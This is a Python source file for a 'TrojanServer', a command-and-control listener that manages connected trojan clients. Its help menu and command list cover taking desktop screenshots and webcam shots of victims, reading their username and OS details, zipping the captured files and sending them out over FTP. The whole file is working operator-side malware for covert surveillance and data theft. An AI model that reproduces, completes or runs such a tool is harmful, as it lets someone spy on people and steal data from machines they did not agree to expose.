import socket,threading
import os

class TrojanServer(object):
    def __init__(self):
        self.host = "0.0.0.0"                       # You IP
        self.port = 50000                           # You Port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.host, self.port))
        print("Server running...")
        print("type 'help' for commands")
        print("first send the command 'set global ip' before doing something specific to another client!")
        print("this updates the public ip of the client that is needed to create and send the files!")
        print()

    def listener(self):
        self.s.listen(10)
        while True:
            client, address = self.s.accept()
            ipstr= address[0] + ":"+ str(address[1])
            client.settimeout(60)
            print("[Server]>> Get connection from "+ ipstr)
            threading.Thread(target=self.client_conn, name=ipstr, args=(client,address)).start()
    
    def client_conn(self,client, address):
        # all commands in the list !
        list_of_commands=["show clients","show os","show global ip","show username","make screenshot"
        ,"make cam shot","exit client","help","show os version","make zip","remove zip","send ftp zip","set global ip"]

        while True:
            ipstr= address[0] + ":" + str(address[1]) + " >> "
            cmd = ""
            while cmd == "":
                cmd = input(ipstr).strip()
            
            if cmd.lower() == "show clients":
                print()
                print("CLIENTS:")
                print("========")
                for t in threading.enumerate():
                    print(t.getName())
            
            elif cmd.lower().startswith("useconn"):
                try:
                    tmp = cmd.split(" ")
                    for t in threading.enumerate():
                        if (t.getName() == tmp[1].strip()):
                            t.join()
                except RuntimeError:
                    print("[Server]>> is already in use")
                    continue
            
            ### HELP ###
            elif cmd.lower() == "help" or cmd.lower() == "?":
                print()
                print("COMMANDS:")
                print("=========")
                print("set global ip        - saves the current IP address, this is a requirement for the other commands")
                print("show clients         - List all connected clients")
                print("show os              - show you the OS")
                print("show global ip       - show the global IP,and updates the client's public ip")
                print("show username        - show username from the user")
                print("show os version      - show os version")
                print("useconn [IP:PORT]    - Switch to the connection")
                print("make screenshot      - make a screenshot from the desktop")
                print("make cam shot        - make a shot from the webcam")
                print("make zip             - compresses all files created (screenshot, cam shot etc.)")
                print("remove zip           - deletes the zip file that was created by 'make zip'")
                print("send ftp zip         - sends the 'make zip' file via ftp")
                print("exit client          - closes the connection from the client")
                print("help or ?            - Show all commands and options")
                print()
            
            # Put all commands here!
            elif not cmd.lower() in list_of_commands:
                print("[Server]>> command not found")
                continue

            ### SEND ###
            else:
                try:
                    b_arr = bytearray()
                    b_arr.extend(map(ord, cmd))
                    client.send(b_arr)

                    ### LISTEN DATA ###  
                    data = client.recv(8192).decode("UTF-8",errors="replace")

                    if data:
                        #print("[from "+str(address[0])+":"+str(address[1])+"] >>"+str(data))
                        print("[Client]>> "+str(data))

                        if str(data).lower() == "exit client":
                            raise ConnectionError("[-] Client disconnected")
                    
                    else:
                        raise ConnectionError("[-] Client disconnected")

                except ConnectionError:
                    print("[Server]>> Client "+ str(address)+" disconnected")
                    client.close()
                    return False

if __name__== "__main__":
    trojan_server = TrojanServer()
    trojan_server.listener()